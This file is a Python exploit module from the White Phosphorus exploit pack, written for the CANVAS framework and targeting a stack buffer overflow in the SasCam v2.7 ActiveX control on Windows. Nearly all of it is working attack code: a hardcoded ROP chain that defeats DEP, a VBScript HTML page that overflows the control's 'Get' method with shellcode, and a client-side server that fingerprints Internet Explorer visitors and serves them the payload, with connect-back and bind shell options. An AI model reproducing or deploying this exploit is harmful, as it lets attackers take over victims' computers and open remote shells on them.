
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *

from exploitutils import *
from tcpexploit import *

from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator


######################################################################################
NAME = "SasCam v2.7 ActiveX Overflow"
DESCRIPTION = "Exploits a remote stack overflow in SasCam v2.7"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='SaschArt'          
DOCUMENTATION["Date public"] = "2010-07-05"
DOCUMENTATION["References"] = " http://www.exploit-db.com/exploits/14215/"
DOCUMENTATION["Repeatability"] = "Unlimited"                              
DOCUMENTATION["Notes"] = """
This is a client-side exploit - so use it via clientd, or run the module and send the created file to the target user.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['DELIVERY'] = 'HTTP'
PROPERTY['VERSION'] = [ "2003", "XP", "2000", "Vista", "7"]

NOTES="""
This is a client-side exploit - so use it via clientd, or run the module and
host the file on a web server.

---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> SasCam v2.7 ActiveX Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_sascam_27/wp_sascam_27  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0

"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = { 
    0 : ["Windows", (0x00000000, 0x00000000, 0x0000), []]
}


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]

    DEFAULT_PAYLOAD = 1

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.encode_printable = True        
                
        self.badstring = "\x00\x09\x0d\xff"
        
        #Randomisze name for clientd
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"        
                
        # HTTP Custom Stuff
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
       
        return

    def is_vulnerable(self, info_dict):
        # Called from ClientD, returns a value used to rank the exploit within attacking modules
        """
        Check for IE
        """
        self.isClientD = True
        if "MSIE" in info_dict['user_agent']:
            self.log("WP> Target has MSIE")
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0] #it's a list in actuality
            self.log("WP> language found: %s"%language)
            if "en-us" in language:
                return 95
            else:
                return 20
        return 0

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return  

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # If Called from clientD, update shellcode accordingly
        if self.isClientD: 
            if self.useSSLMOSDEF:
                self.DEFAULT_PAYLOAD = 1
            else:
                self.DEFAULT_PAYLOAD = 2
            
        # Selected shell options
        self.wp_getShellcodeType()
        
        # If called from clientD there will be no target here
        if self.target:    
            self.host=self.target.interface
            
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makefile(self):
        # Make the exploit file
               
        depSc = pack('<L', 0x1001403B)  # PUSH ESP, POP EDI,
        depSc += pack('<L', 0x11111111)
        depSc += pack('<L', 0x11111111)
        depSc += pack('<L', 0x11111111)
        depSc += pack('<L', 0x10011BC5) #MOV EAX,EDI,
        depSc += pack('<L', 0x11111111)
        depSc += pack('<L', 0x11111111)
        
        depSc += pack('<L', 0x1001175B) #ADD EAX,20
        depSc += pack('<L', 0x1001175B)
        depSc += pack('<L', 0x1001175B)
        depSc += pack('<L', 0x1001175B)
        depSc += pack('<L', 0x1001175B)        
        depSc += pack('<L', 0x1001175B)
        
        depSc += pack('<L', 0x10017374) #POP ECX
        depSc += pack('<L', 0x22222220)
        depSc += pack('<L', 0x1002B040) #MOV EDX,EAX
        depSc += pack('<L', 0x10027938) #MOV EAX,EDX        
        
        depSc += pack('<L', 0x10022BB2) #MOV DWORD PTR DS:[EDX],EAX
        depSc += pack('<L', 0x10027BE0) #XOR EAX,EAX
        depSc += pack('<L', 0x10027BD7) #ADD EDX,4 
        
        depSc += pack('<L', 0x10022276) #POP EAX
        depSc += pack('<L', 0x111118E1) # Size 2000 bytes
        depSc += pack('<L', 0x10017374) # POP ECX
        depSc += pack('<L', 0x11111111)
        depSc += pack('<L', 0x1001BE16) #SUB EAX,ECX
        
        depSc += pack('<L', 0x10022BB2) #MOV DWORD PTR DS:[EDX],EAX
        depSc += pack('<L', 0x10027BE0) #XOR EAX,EAX
        depSc += pack('<L', 0x10027BD7) #ADD EDX,4
        
        depSc += pack('<L', 0x10022276) #POP EAX
        depSc += pack('<L', 0x11112111)
        depSc += pack('<L', 0x10017374) # POP ECX
        depSc += pack('<L', 0x11111111)
        depSc += pack('<L', 0x1001BE16) #SUB EAX,ECX
        
        depSc += pack('<L', 0x10022BB2) #MOV DWORD PTR DS:[EDX],EAX
        depSc += pack('<L', 0x10027BE0) #XOR EAX,EAX
        depSc += pack('<L', 0x10027BD7) #ADD EDX,4  
        
        depSc += pack('<L', 0x10022276) #POP EAX
        depSc += pack('<L', 0x11111151)
        depSc += pack('<L', 0x10017374) # POP ECX
        depSc += pack('<L', 0x11111111)
        depSc += pack('<L', 0x1001BE16) #SUB EAX,ECX  
        
        depSc += pack('<L', 0x10022BB2) #MOV DWORD PTR DS:[EDX],EAX
        
        depSc += pack('<L', 0x10011A05) #POP EBX pop writeable 
        depSc += pack('<L', 0x1003ef40) #
        depSc += pack('<L', 0x10022276) #POP EAX
        depSc += pack('<L', 0x1002D104) # Import Address
        depSc += pack('<L', 0x10011A06) # RET
        depSc += pack('<L', 0x10011A06) # RET
                
        depSc += pack('<L', 0x10021DA6) # CALL DWORD PTR DS:[EAX]
        depSc += pack('<L', 0x11111111) #SPACE
        depSc += pack('<L', 0x11111111) #SPACE
        depSc += pack('<L', 0x11111111) #SPACE
        depSc += pack('<L', 0x11111111) #SPACE

        depSc += pack('<L', 0x1001403B)  # PUSH ESP, POP EDI,
        depSc += pack('<L', 0x90909090)
        depSc += pack('<L', 0x44444444) # Fix ESP
        depSc += pack('<L', 0x04eb9090)  # Jmp over call
        
        depSc += pack('<L', 0x1002716A) # Call EDI
        
        depSc += self.shellcode
        
        filedata="""
<html>
<object classid='clsid:0297D24A-F425-47EE-9F3B-A459BCE593E3'
id='target'></object>
<script language = 'vbscript'>

buf = String(8293, "A")
ret = unescape("%D9%C7%02%10")
padsp = String(16, "a")
sc = unescape("SHELLCODE")

exploit = buf + ret + padsp + sc
target.Get exploit
</script>
<html>
""".replace('SHELLCODE',urlencode(depSc))
        return filedata

    def makesploit(self,clientheader,clientbody):
        self.createShellcode()
        
        # The main call from ClientD
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
    
        self.log('WP> User agent of connecting host: %s' % user_agent)        
        
        if clientheader.URL.count(self.filename):
            self.log('WP> Serving exploit file')

            data=self.makefile()
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')

        return h,b

    def run(self):
        
        filedata=self.makefile()
        self.log("WP> Opening %s for output"%(self.filename))
        
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(self.filename))
        
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
